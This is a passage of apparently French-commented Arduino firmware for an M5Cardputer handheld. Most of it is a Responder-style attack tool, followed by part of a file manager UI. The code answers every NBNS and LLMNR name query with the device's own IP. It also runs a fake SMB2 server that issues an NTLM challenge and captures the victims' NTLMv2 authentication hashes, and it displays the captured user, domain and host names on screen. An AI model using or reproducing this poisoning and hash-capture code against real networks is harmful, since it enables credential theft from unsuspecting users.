  auto& d = M5Cardputer.Display;

  // petit radar en coin
  int screenW      = d.width();
  const int smallR = 15;
  const int margin = 4;
  int cx = screenW - smallR - margin;
  int cy = smallR + margin;
  int r  = smallR;

  currentCx = cx;
  currentCy = cy;
  currentR  = r;
  currentAngle = angle;

  // fond et cercle fixe
  d.fillCircle(cx, cy, r + 1, TFT_BLACK);
  d.drawCircle(cx, cy, r,         TFT_DARKGREY);
  d.drawCircle(cx, cy, r * 2 / 3, TFT_DARKGREY);
  d.drawCircle(cx, cy, r / 3,     TFT_DARKGREY);

  // croix (traits horizontaux et verticaux)
  d.drawLine(cx - r, cy, cx + r, cy, TFT_DARKGREY);
  d.drawLine(cx, cy - r, cx, cy + r, TFT_DARKGREY);

  // balayage
  int x2 = cx + cosf(angle) * r;
  int y2 = cy + sinf(angle) * r;
  d.drawLine(cx, cy, x2, y2, TFT_GREEN);

  angle += 0.15f;
  if (angle >= 2 * PI) angle -= 2 * PI;

  // dessin des points avec fade-out
  for (int i = 0; i < detCount; i++) {
    auto& p = detections[i];
    float fade = float(p.ttl) / DET_TTL;
    uint16_t col = d.color565(
      uint8_t(173 * fade),
      uint8_t(255 * fade),
      uint8_t(47  * fade)
    );
    d.fillCircle(p.x, p.y, 2, col);
    if (--p.ttl <= 0) {
      for (int j = i; j < detCount - 1; j++)
        detections[j] = detections[j + 1];
      detCount--;
      i--;
    }
  }
}


void updateHashUI() {
  auto& d = M5Cardputer.Display;
  d.fillScreen(BLACK);

  // 1) NTLM count
  d.setTextSize(1.3);
  d.setTextColor(WHITE, BLACK);
  d.setCursor(5, 5);
  d.print("NTLM: ");
  d.setTextSize(2);
  d.print(hashCount);

  // 2) User
  d.setTextSize(1.3);
  d.setCursor(5, 30);
  d.print("User: ");
  d.setTextSize(2);
  d.print(lastUser);

  // 3) Domain
  d.setTextSize(1.3);
  d.setCursor(5, 55);
  d.print("Domain: ");
  d.setTextSize(2);
  d.print(lastDomain);

  // 4) Client (hostname)
  d.setTextSize(1.3);
  d.setCursor(5, 80);
  d.print("Client: ");
  d.setTextSize(2);
  d.print(lastClient);

  // 5) Query (NBNS/LLMNR + name)
  d.setTextSize(1.3);
  d.setCursor(5, 105);
  d.print(lastQueryProtocol + ": ");
  d.setTextSize(2);
  d.print(lastQueryName);
}

// DÃ©codage NetBIOS "A..P" (32 octets) -> "NAME<XX>"
void decodeNetBIOSLabel(const uint8_t* enc32, char* out, size_t outSize) {
  if (!enc32 || !out || outSize == 0) return;
  out[0] = '\0';

  // Convertit 32 caractÃ¨res A..P en 16 octets bruts
  uint8_t raw[16];
  for (int i = 0; i < 16; ++i) {
    uint8_t c1 = enc32[2 * i];
    uint8_t c2 = enc32[2 * i + 1];
    uint8_t hi = (c1 >= 'A' && c1 <= 'P') ? (uint8_t)(c1 - 'A') : 0;
    uint8_t lo = (c2 >= 'A' && c2 <= 'P') ? (uint8_t)(c2 - 'A') : 0;
    raw[i] = (uint8_t)((hi << 4) | lo);
  }

  // 15 premiers octets = nom (paddÃ© avec des espaces), 16e = suffixe/type
  char name[16];
  memcpy(name, raw, 15);
  name[15] = '\0';

  // Trim des espaces de fin
  int end = 14;
  while (end >= 0 && name[end] == ' ') end--;
  name[end + 1] = '\0';

  uint8_t suffix = raw[15];  // ex: 0x00 pour <00>

  // Rend "NAME<XX>" (out doit Ãªtre assez grand, p.ex. 40 octets)
  // %02X fonctionne sur Arduino (printf/printf-like).
  snprintf(out, outSize, "%s<%02X>", name, suffix);
}



unsigned long lastAnim = 0;


void responder() {
  M5.Lcd.fillScreen(BLACK);
  M5Cardputer.Display.setTextColor(WHITE, BLACK);
  hashCount = 0;
  // DÃ©marrer l'Ã©coute NBNS (UDP 137)
  if (!nbnsUDP.begin(NBNS_PORT)) {
    Serial.println(F("Erreur: Impossible to listen on UDP 137"));
  }
  // DÃ©marrer l'Ã©coute LLMNR (UDP 5355) en IPv4 uniquement
  if (!llmnrUDP.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT)) {
    Serial.println(F("Erreur: Ã©chec abonnement multicast LLMNR"));
  }
  // DÃ©marrer le serveur SMB (TCP 445)
  smbServer.begin();
  smbState.active = false;

  Serial.println(F("Responder ready - Waiting for NBNS/LLMNR request..."));
  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
  M5Cardputer.update();
  unsigned long now = millis();
  if (now - lastAnim > 250) {
      // Choix de la fonction selon le count
      if (hashCount == 0) {
          showWaitingAnimation();
      } else if (hashCount == 1) {
          detCount = 0; 
          showActiveAnimation();
      } else {
          showActiveAnimation();
      }
      lastAnim = now;
  }
  int packetSize = nbnsUDP.parsePacket();
  if (packetSize > 0) {
    uint8_t buf[100];
    int len = nbnsUDP.read(buf, sizeof(buf));
    if (len >= 50) { // taille minimale d'une requÃªte NBNS standard ~50 octets
      // VÃ©rifier qu'il s'agit d'une requÃªte NBNS de type nom (0x20)
      // Flags (octets 2-3) : bit 15 = 0 pour question
      uint16_t flags = (buf[2] << 8) | buf[3];
      uint16_t qdCount = (buf[4] << 8) | buf[5];
      uint16_t qType = (buf[len - 4] << 8) | buf[len - 3]; // Type sur les 2 octets avant les 2 derniers (class)
      uint16_t qClass = (buf[len - 2] << 8) | buf[len - 1]; // Class sur les 2 derniers octets
      if ((flags & 0x8000) == 0 && qdCount >= 1 && qType == 0x0020 && qClass == 0x0001) {
        // Extraire le nom encodÃ© sur 32 octets Ã  partir de l'offset 13 (aprÃ¨s length byte)
        // Offset 12 = length of name (0x20), offset 13..44 = nom encodÃ©
        if (len >= 46 && buf[12] == 0x20) {
          char nbName[40];
          decodeNetBIOSLabel(buf + 13, nbName, sizeof(nbName));
          lastQueryProtocol = "NBNS";
          lastQueryName = nbName;
          Serial.printf("[NBNS] Query for %s from %s\n", nbName, nbnsUDP.remoteIP().toString().c_str());
          // RÃ©pondre Ã  toute requÃªte NBNS receivede sans vÃ©rifier le nom demandÃ©
          uint8_t resp[80];
          // Copier Transaction ID
          resp[0] = buf[0];
          resp[1] = buf[1];
          // Flags: rÃ©ponse (bit15=1), AA=1, Rcode=0
          resp[2] = 0x84;
          resp[3] = 0x00;
          // QDcount=0, ANcount=1, NScount=0, ARcount=0
          resp[4] = 0x00; resp[5] = 0x00;
          resp[6] = 0x00; resp[7] = 0x01;
          resp[8] = 0x00; resp[9] = 0x00;
          resp[10] = 0x00; resp[11] = 0x00;
          // Name (copier les 34 octets du nom encodÃ© + terminator de la requÃªte)
          memcpy(resp + 12, buf + 12, 34);
          // Type & Class (2 octets chacun, mÃªme que la question)
          resp[46] = 0x00; resp[47] = 0x20;  // Type NB
          resp[48] = 0x00; resp[49] = 0x01;  // Class IN
          // TTL (4 octets)
          resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x3C; // TTL = 60 secondes
          // Data length (6 octets pour NB)
          resp[54] = 0x00; resp[55] = 0x06;
          // NB flags (unique = 0x0000)
          resp[56] = 0x00; resp[57] = 0x00;
          // Adresse IP (4 octets)
          IPAddress ip = getIPAddress();
          resp[58] = ip[0];
          resp[59] = ip[1];
          resp[60] = ip[2];
          resp[61] = ip[3];
          char decoded[16];
          // Envoyer la rÃ©ponse NBNS Ã  l'Ã©metteur
          nbnsUDP.beginPacket(nbnsUDP.remoteIP(), nbnsUDP.remotePort());
          nbnsUDP.write(resp, 62);
          nbnsUDP.endPacket();
          addDetectionPoint();
          Serial.println(F("Answer NBNS send."));
        }
      }
    }
  }
  /**************** Traitement des requÃªtes LLMNR ****************/
  packetSize = llmnrUDP.parsePacket();
  if (packetSize > 0) {
    uint8_t buf[300];
    int len = llmnrUDP.read(buf, sizeof(buf));
    Serial.printf("[LLMNR] paquet %d octets received\n", len);

    /* 1) ContrÃ´les de base ------------------------------------------------ */
    if (len < 12) continue;                             // trop court
    uint16_t flags   = (buf[2] << 8) | buf[3];
    uint16_t qdCount = (buf[4] << 8) | buf[5];
    uint16_t anCount = (buf[6] << 8) | buf[7];
    if ( (flags & 0x8000) || qdCount == 0 || anCount != 0) continue;  //here modif return en continue 
     
    /* 2) Lecture du premier label (on ne gÃ¨re quâ€™un seul label simple) ---- */
    uint8_t nameLen = buf[12];
    if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) continue;
    if (buf[13 + nameLen] != 0x00) continue;            // on veut exactement 1 label + terminator

    const uint8_t* qtypePtr  = buf + 13 + nameLen + 1;    // +1 -> terminator 0x00
    uint16_t qType  = (qtypePtr[0] << 8) | qtypePtr[1];
    uint16_t qClass = (qtypePtr[2] << 8) | qtypePtr[3];

    /* 3) Debug : affichage du nom et du type --------------------------------*/
    char qName[65];  memcpy(qName, buf + 13, nameLen);  qName[nameLen] = '\0';
    Serial.printf("[LLMNR] Query Â« %s Â», type 0x%04X\n", qName, qType);
    lastQueryName     = String(qName);
    lastQueryProtocol = "LLMNR";

    /* 4) On rÃ©pond aux types A (0x0001) et AAAA (0x001C) ------------------- */
    bool isA    = (qType == 0x0001);
    bool isAAAA = (qType == 0x001C);
    if (!isA && !isAAAA) continue;                       // on ignore les autres

    if (qClass != 0x0001) continue;                      // IN seulement

    /* 5) Construction de la rÃ©ponse --------------------------------------- */
    uint16_t questionLen = 1 + nameLen + 1 + 2 + 2;    // label + len0 + type + class
    uint8_t resp[350];

    /* -- Header -- */
    resp[0] = buf[0]; resp[1] = buf[1];                // Transaction ID
    resp[2] = 0x84;   resp[3] = 0x00;                  // QR=1 | AA=1
    resp[4] = 0x00; resp[5] = 0x01;                    // QDcount = 1
    resp[6] = 0x00; resp[7] = 0x01;                    // ANcount = 1
    resp[8] = resp[9]  = 0x00;                         // NScount
    resp[10] = resp[11] = 0x00;                        // ARcount

    /* -- Question copiÃ©e telle quelle -- */
    memcpy(resp + 12, buf + 12, questionLen);

    /* -- Answer -- */
    uint16_t ansOff = 12 + questionLen;
    resp[ansOff + 0] = 0xC0;          // pointeur 0xC00C vers le nom en question
    resp[ansOff + 1] = 0x0C;
    resp[ansOff + 2] = qtypePtr[0];   // mÃªme TYPE que la question
    resp[ansOff + 3] = qtypePtr[1];
    resp[ansOff + 4] = 0x00; resp[ansOff + 5] = 0x01;   // CLASS = IN
    resp[ansOff + 6] = 0x00; resp[ansOff + 7] = 0x00;   // TTL = 30 s
    resp[ansOff + 8] = 0x00; resp[ansOff + 9] = 0x1E;

    if (isA) {
      /* ---- RÃ©ponse IPv4 (4 octets) ---- */
      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x04; // RDLENGTH
      IPAddress ip = getIPAddress();
      resp[ansOff + 12] = ip[0]; resp[ansOff + 13] = ip[1];
      resp[ansOff + 14] = ip[2]; resp[ansOff + 15] = ip[3];
      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
      llmnrUDP.write(resp, ansOff + 16);
      llmnrUDP.endPacket();
      addDetectionPoint();
    } else {
      /* ---- RÃ©ponse IPv6 (on renvoie ::FFFF:IPv4) ---- */
      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x10; // RDLENGTH = 16
      /* ::ffff:a.b.c.d  â†’  0â€¦0 ffff  + IPv4 */
      memset(resp + ansOff + 12, 0, 10);
      resp[ansOff + 22] = 0xFF; resp[ansOff + 23] = 0xFF;
      IPAddress ip = getIPAddress();
      resp[ansOff + 24] = ip[0]; resp[ansOff + 25] = ip[1];
      resp[ansOff + 26] = ip[2]; resp[ansOff + 27] = ip[3];
      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
      llmnrUDP.write(resp, ansOff + 28);
      llmnrUDP.endPacket();
      addDetectionPoint();
    }

    Serial.println(F("[LLMNR] â†’ answer send"));
  }

  // Accepter nouvelle connexion SMB si non dÃ©jÃ  en cours
  if (!smbState.active) {
    WiFiClient newClient = smbServer.available();
    if (newClient) {
      smbState.client = newClient;
      smbState.active = true;
      smbState.sessionId = 0;
      Serial.println(F("Connexion SMB received, starting the SMB2 negociation..."));
    }
  }

  // GÃ©rer la connexion SMB active (Ã©tat machine NTLM)
  if (smbState.active && smbState.client.connected()) {
    // DÃ©finir un petit timeout pour lecture (Ã©vitons blocage)
    smbState.client.setTimeout(100);
    // Lire l'entÃªte NetBIOS (4 octets) si disponible
    if (smbState.client.available() >= 4) {
      uint8_t nbss[4];
      if (smbState.client.read(nbss, 4) == 4) {
        uint32_t smbLength = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
        if (smbLength == 0) {
          // Keep-alive ou paquet vide, on ignore
        } else {
          // Lire le paquet SMB complet
          uint8_t *packet = (uint8_t*)malloc(smbLength);
          if (!packet) {
            Serial.println(F("MÃ©moire insuffisante pour SMB"));
            smbState.client.stop();
            smbState.active = false;
          } else {
            if (smbState.client.read(packet, smbLength) == smbLength) {
              // VÃ©rifier protocole SMB2 (header commence par 0xFE 'S' 'M' 'B')
              if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                uint16_t command = packet[12] | (packet[13] << 8);
                // NÃ©gociation SMB2
                if (command == 0x0000) { // SMB2 NEGOTIATE
                  Serial.println(F("RequÃªte SMB2 Negotiate receivede."));
                  // Construire et envoyer la rÃ©ponse SMB2 Negotiate (sÃ©lection SMB2.1)
                  // Copier l'en-tÃªte du client pour le renvoyer modifiÃ©
                  uint8_t resp[128];
                  // NetBIOS header
                  resp[0] = 0x00;
                  // On remplira la longueur plus tard
                  // SMB2 header (64 octets)
                  memcpy(resp + 4, packet, 64);
                  // Marquer comme rÃ©ponse
                  resp[4 + 4] = 0x40; resp[4 + 5] = 0x00; // StructureSize (non utilisÃ© pour header)
                  // Flags: bit0 (ServerToRedir) = 1
                  resp[4 + 16] = packet[16] | 0x01;
                  // Status = 0 (succÃ¨s)
                  *(uint32_t*)(resp + 4 + 8) = 0x00000000;
                  // CrÃ©dit accordÃ© (conserver celui demandÃ© ou au moins 1)
                  resp[4 + 14] = packet[14];
                  resp[4 + 15] = packet[15];
                  if (resp[4 + 14] == 0 && resp[4 + 15] == 0) {
                    resp[4 + 14] = 0x01;
                    resp[4 + 15] = 0x00;
                  }
                  // SessionId = 0 (pas encore de session Ã©tablie)
                  memset(resp + 4 + 40, 0, 8);
                  // Command reste 0x0000, MessageId idem (copiÃ©)
                  // TreeId peut rester comme dans la requÃªte (pas utilisÃ©)
                  // PrÃ©parer le corps Negotiate Response
                  // StructureSize = 65 (0x41)
                  resp[4 + 64] = 0x41;
                  resp[4 + 65] = 0x00;
                  // SecurityMode: 0x01 (signing enabled, not required)
                  resp[4 + 66] = 0x01;
                  resp[4 + 67] = 0x00;
                  // Dialect = 0x0210 (Little-endian: 0x10 0x02)
                  resp[4 + 68] = 0x10;
                  resp[4 + 69] = 0x02;
                  // Reserved
                  resp[4 + 70] = 0x00;
                  resp[4 + 71] = 0x00;
                  // Server GUID (16 octets) - on peut utiliser l'adresse MAC pour uniq.
                  uint8_t mac[6];
                  WiFi.macAddress(mac);
                  uint8_t serverGuid[16] = {
                    /* MAC1, MAC2, MAC3, MAC4, MAC5, MAC6, */
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                  };
                  WiFi.macAddress(serverGuid);
                  memcpy(resp + 4 + 72, serverGuid, 16);
                  // Copier MAC dans GUID (les 6 premiers octets)
                  memcpy(resp + 4 + 72, mac, 6);
                  // Capabilities = 0 (pas de DFS, pas de multi-crÃ©dit)
                  *(uint32_t*)(resp + 4 + 88) = 0x00000000;
                  // MaxTransaction, MaxRead, MaxWrite = 65536 (0x10000)
                  *(uint32_t*)(resp + 4 + 92) = 0x00010000;
                  *(uint32_t*)(resp + 4 + 96) = 0x00010000;
                  *(uint32_t*)(resp + 4 + 100) = 0x00010000;
                  // Current System Time (8 bytes) et Boot Time (8 bytes) Ã  0 (ou on pourrait mettre heure rÃ©elle)
                  memset(resp + 4 + 104, 0, 16);
                  // SecurityBufferOffset et Length = 0 (pas de token de sÃ©curitÃ© dans Negotiate)
                  resp[4 + 120] = 0x00; resp[4 + 121] = 0x00;
                  resp[4 + 122] = 0x00; resp[4 + 123] = 0x00;
                  // Calculer longueur SMB2 message (64 + 65 = 129 octets)
                  uint32_t smb2Len = 64 + 65;
                  resp[1] = (smb2Len >> 16) & 0xFF;
                  resp[2] = (smb2Len >> 8) & 0xFF;
                  resp[3] = smb2Len & 0xFF;
                  // Envoyer
                  smbState.client.write(resp, 4 + smb2Len);
                  Serial.println(F("SMB2 Negotiate answer send (Dialect SMB2.1)."));
                }
                // Session Setup Request
                else if (command == 0x0001) {
                  // Extraire la charge de sÃ©curitÃ© (NTLMSSP) de la requÃªte
                  // Chercher "NTLMSSP"
                  int ntlmIndex = -1;
                  for (uint32_t i = 0; i < smbLength - 7; ++i) {
                    if (memcmp(packet + i, "NTLMSSP", 7) == 0) {
                      ntlmIndex = i;
                      break;
                    }
                  }
                  if (ntlmIndex >= 0 && ntlmIndex + 8 < smbLength) {
                    uint8_t ntlmMsgType = packet[ntlmIndex + 8];
                    if (ntlmMsgType == 1) {
                      // Type 1: NTLMSSP Negotiate
                      Serial.println(F("NTLMSSP Type 1 received, sending Type 2 (challenge)..."));

                      // 1) GÃ©nÃ¨re un challenge alÃ©atoire de 8 octets
                      for (int i = 0; i < 8; ++i) {
                        smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
                      }

                      // 2) Construit dynamiquement le blob NTLM Type 2
                      buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);

                      // 3) Conserve un SessionId unique
                      smbState.sessionId = ((uint64_t)esp_random() << 32) | esp_random();
                      if (smbState.sessionId == 0) smbState.sessionId = 1;

                      // 4) PrÃ©pare le SMB2 Session Setup Response + blob
                      uint8_t resp[600] = {0};

                      // â€” NetBIOS header (longueur calculÃ©e plus bas)
                      resp[0] = 0x00;

                      // â€” Copie lâ€™en-tÃªte SMB2 receivede
                      memcpy(resp + 4, packet, 64);

                      // â€” Marque en rÃ©ponse
                      resp[4 + 16] = packet[16] | 0x01;              // ServerToRedir
                      *(uint32_t*)(resp + 4 + 8)  = 0xC0000016;      // STATUS_MORE_PROCESSING_REQUIRED

                      // â€” CrÃ©dits et IDs
                      resp[4 + 14] = packet[14];
                      resp[4 + 15] = packet[15];
                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;

                      // â€” Corps Session Setup
                      resp[4 + 64] = 0x09;  // StructureSize
                      resp[4 + 65] = 0x00;
                      resp[4 + 66] = 0x00;  // SessionFlags
                      resp[4 + 67] = 0x00;

                      // â€” Offset et longueur du blob
                      *(uint16_t*)(resp + 4 + 68) = 0x48;            // SecurityBufferOffset = 72
                      *(uint16_t*)(resp + 4 + 70) = ntlmType2Len;    // SecurityBufferLength

                      // â€” Padding
                      resp[4 + 72] = resp[4 + 73] = 0x00;

                      // 5) Copie le blob gÃ©nÃ©rÃ©
                      memcpy(resp + 4 + 72, ntlmType2Buffer, ntlmType2Len);

                      // 6) Calcule et Ã©crit la longueur NetBIOS
                      uint32_t smb2Len = 64 + 9 + ntlmType2Len;
                      resp[1] = (smb2Len >> 16) & 0xFF;
                      resp[2] = (smb2Len >>  8) & 0xFF;
                      resp[3] =  smb2Len        & 0xFF;

                      // 7) Envoie la rÃ©ponse
                      smbState.client.write(resp, 4 + smb2Len);
                      Serial.println(F("Type 2 dynamique send. Waiting for Type 3..."));
                    }
                    else if (ntlmMsgType == 3) {
                      // Typeâ€¯3 : NTLMSSP Authenticate (SMB v2)
                      Serial.println(F("NTLMSSP Type 3 received, checking for hash..."));
                      extractAndPrintHash(packet,            // pointeur dÃ©but paquet
                                          smbLength,         // longueur totale SMB
                                          packet + ntlmIndex // pointeur dÃ©but NTLMSSP
                                         );

                      // --- rÃ©ponse finale SMB2 Â« success Â» puis fermeture ----------
                      uint8_t resp[100];
                      resp[0] = 0x00;                        // NBSS
                      memcpy(resp + 4, packet, 64);          // header copiÃ©
                      resp[4 + 16] = packet[16] | 0x01;      // ServerToRedir
                      *(uint32_t*)(resp + 4 + 8) = 0x00000000;       // STATUS_SUCCESS
                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
                      resp[4 + 64] = 0x09;  resp[4 + 65] = 0x00;     // StructureSize
                      resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;     // SessionFlags
                      resp[4 + 68] = 0x48; resp[4 + 69] = 0x00;     // SecBufOffset
                      resp[4 + 70] = 0x00; resp[4 + 71] = 0x00;     // SecBufLen
                      resp[4 + 72] = resp[4 + 73] = 0x00;           // padding

                      uint32_t smb2Len = 64 + 9;
                      resp[1] = (smb2Len >> 16) & 0xFF;
                      resp[2] = (smb2Len >>  8) & 0xFF;
                      resp[3] =  smb2Len        & 0xFF;

                      smbState.client.write(resp, 4 + smb2Len);
                      smbState.client.stop();
                      smbState.active = false;
                      Serial.println(F("Session SMB finnished."));
                    }
                  }
                }
                // Tree Connect ou autre commande aprÃ¨s authent (optionnel, ici on ferme la connexion donc probablement sans objet)
                else if (command == 0x0003) {
                  // Tree Connect Request (aprÃ¨s authent rÃ©ussie)
                  Serial.println(F("Receive Tree Connect (ressource acces). End of session."));
                  smbState.client.stop();
                  smbState.active = false;
                }
              } else if (packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                Serial.println(F("Paquet SMBv1 received."));
                handleSMB1(packet, smbLength);
                continue;
              }
            }
            free(packet);
          }
        }
      }
    }
  }

  if (smbState.active && !smbState.client.connected()) {
    smbState.client.stop();
    smbState.active = false;
    Serial.println(F("Client SMB disconnected."));
  }
}
  detCount = 0;

  waitAndReturnToMenu("Return to menu");
}



/*
============================================================================================================================
File Manager
============================================================================================================================
*/

File currentFile;

// ---------- globals pour fileManager ----------
String fmCurrentPath             = "/";
int    fmFileCursor              = 0;
int    fmTopVisibleIndex         = 0;
const  int fmMaxVisibleItems     = 9;
bool   fmIsOperationInProgress   = false;

void previewTextFile(const char *path) {
  // Ouvre le fichier en lecture
  File f = SD.open(path);
  if (!f) {
    Serial.printf("Erreur : impossible d'ouvrir %s\n", path);
    return;
  }

  // Lire toutes les lignes dans un vector<String>
  std::vector<String> lines;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    // Retirer '\r' final sâ€™il y en a (pour compatibilitÃ© CRLF)
    if (line.endsWith("\r")) {
      line.remove(line.length() - 1);
    }
    lines.push_back(line);
  }
  f.close();

  // Extraire uniquement le nom de fichier (pas tout le chemin)
  String filename = String(path);
  int lastSlash = filename.lastIndexOf('/');
  if (lastSlash >= 0) {
    filename = filename.substring(lastSlash + 1);
  }

  // ParamÃ¨tres de la zone dâ€™affichage
  const int areaX      = 0;
  const int areaY      = 13;
  const int areaW      = 240;
  const int areaH      = 122;          // mÃªme zone que dans fileManager
  const int lineHeight = 11;           // hauteur en pixels dâ€™une ligne
  const int nRows      = fmMaxVisibleItems;               // 9 lignes visibles
  const int nCols      = 26;            // nombre de colonnes pour couvrir 240px / 6px par caractÃ¨re

  int previewTopLine    = 0;            // index de la premiÃ¨re ligne affichÃ©e
  int previewLeftCol    = 0;            // index de la premiÃ¨re colonne (scroll horizontal)

  bool refresh = true;
  while (true) {
    if (refresh) {
      // Effacer la zone de preview
      M5.Display.fillRect(areaX, areaY, areaW, areaH, TFT_BLACK);

      // Afficher lâ€™enâ€tÃªte avec le nom du fichier (en jaune)
      M5.Display.setCursor(5, areaY);
      M5.Display.setTextColor(TFT_YELLOW);
      M5.Display.print("Fichier: ");
      M5.Display.println(filename);
      M5.Display.drawLine(areaX, areaY + 12, areaW, areaY + 12, TFT_DARKGREY);

      // Corps du texte : afficher nRows lignes Ã  partir de previewTopLine
      M5.Display.setTextColor(TFT_LIGHTGREY);
      for (int row = 0; row < nRows; ++row) {
        int idx = previewTopLine + row;
        if (idx >= (int)lines.size()) break;

        // Extraire la sous-chaÃ®ne Ã  partir de previewLeftCol
        String &fullLine = lines[idx];
        String sub;
        if (previewLeftCol < fullLine.length()) {
          sub = fullLine.substring(previewLeftCol);
        } else {
          sub = "";
        }
        // Tronquer si trop long (pour Ã©viter wrapping imprÃ©vu)
        if (sub.length() > nCols) {
          sub = sub.substring(0, nCols);
        }

        M5.Display.setCursor(5, areaY + 14 + row * lineHeight);
        M5.Display.println(sub);
      }
      refresh = false;
    }

    // Lire les touches pour scroll ou sortir
    M5Cardputer.update();

    // â†‘ (haut) : remonter dâ€™une ligne
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      if (previewTopLine > 0) {
        previewTopLine--;
        refresh = true;
      }
      delay(100);
    }
    // â†“ (bas) : descendre dâ€™une ligne
    else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      if (previewTopLine + nRows < (int)lines.size()) {
        previewTopLine++;
        refresh = true;
      }
      delay(100);
    }
    // â† (virgule ',' sur M5) : dÃ©caler vers la gauche (scroll horizontal)
    else if (M5Cardputer.Keyboard.isKeyPressed(',')) {
      if (previewLeftCol > 0) {
        previewLeftCol--;
        refresh = true;
      }
      delay(100);
    }
    // â†’ (slash '/' sur M5) : dÃ©caler vers la droite (scroll horizontal)
    else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
      // Calculer la longueur max des lignes pour limiter le scroll
      int maxLineLen = 0;
      for (auto &L : lines) {
        if ((int)L.length() > maxLineLen) {
          maxLineLen = L.length();
        }
      }
      if (previewLeftCol + nCols < maxLineLen) {
        previewLeftCol++;
        refresh = true;
      }
      delay(100);
    }
    // ` (backtick) : quitter la preview
    else if (M5Cardputer.Keyboard.isKeyPressed('`')) {
      delay(200);
      return;
    }

    delay(10);
  }
}


void fileManager() {
  fmIsOperationInProgress = true;
  M5.Lcd.fillScreen(BLACK);

  while (true) {
    /* -------- lister le contenu du rÃ©pertoire courant -------- */
    std::vector<String> entries;
    std::vector<bool>   isFolder;

    File dir = SD.open(fmCurrentPath.c_str());
    File entry;
    while ((entry = dir.openNextFile())) {
      entries.push_back(String(entry.name()));
      isFolder.push_back(entry.isDirectory());
      entry.close();
    }
    dir.close();

    if (fmCurrentPath != "/") {
      entries.insert(entries.begin(), "..");
      isFolder.insert(isFolder.begin(), true);
    }

    const int total = entries.size();
    fmFileCursor      = constrain(fmFileCursor, 0, total - 1);
    fmTopVisibleIndex = constrain(fmTopVisibleIndex, 0, max(0, total - fmMaxVisibleItems));

    bool refresh = true;
    enterDebounce();
    while (true) {
      /* -------- rafraÃ®chissement Ã©cran -------- */
      if (refresh) {
        M5.Display.fillRect(0, 13, 240, 122, TFT_BLACK);
        M5.Display.setCursor(5, 13);
        M5.Display.setTextColor(TFT_YELLOW);
        M5.Display.print("DIR: ");
        M5.Display.println(fmCurrentPath);
        M5.Display.drawLine(0, 25, 240, 25, TFT_DARKGREY);

        for (int i = 0; i < fmMaxVisibleItems; ++i) {
          int idx = fmTopVisibleIndex + i;
          if (idx >= total) break;

          String name = entries[idx];
          if (isFolder[idx] && name != "..") name += "/";

          int y = 28 + i * 11;
          if (idx == fmFileCursor) {
            M5.Display.fillRect(0, y, 240, 11, menuSelectedBackgroundColor);
            M5.Display.setTextColor(menuTextFocusedColor);
          } else if (isFolder[idx]) {
            M5.Display.setTextColor(TFT_CYAN);
          } else {
            M5.Display.setTextColor(TFT_LIGHTGREY);
          }

          M5.Display.setCursor(5, y);
          M5.Display.println(name);
        }
        refresh = false;
      }

      /* -------- gestion clavier -------- */
      M5Cardputer.update();

      // â”€â”€â”€ HAUT (â€˜;â€™) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        int oldCursor = fmFileCursor;
        fmFileCursor = (fmFileCursor == 0) ? total - 1 : fmFileCursor - 1;

        // si on wrap 0 -> last, on affiche la fin de la liste
        if (oldCursor == 0 && fmFileCursor == total - 1) {
          fmTopVisibleIndex = max(0, total - fmMaxVisibleItems);
        } else if (fmFileCursor < fmTopVisibleIndex) {
          fmTopVisibleIndex = fmFileCursor;
        }
        refresh = true;
        delay(100);
      }
      // â”€â”€â”€ BAS (â€˜.â€™) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        int oldCursor = fmFileCursor;
        fmFileCursor = (fmFileCursor + 1) % total;

        // si on wrap last -> 0, on revient en haut de la liste
        if (oldCursor == total - 1 && fmFileCursor == 0) {
          fmTopVisibleIndex = 0;
        } else if (fmFileCursor >= fmTopVisibleIndex + fmMaxVisibleItems) {
          fmTopVisibleIndex = fmFileCursor - fmMaxVisibleItems + 1;
        }
        refresh = true;
        delay(100);
      }
      // â”€â”€â”€ ENTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        String sel = entries[fmFileCursor];

        if (sel == "..") {
          /* Remonter */
          int slash = fmCurrentPath.lastIndexOf('/');
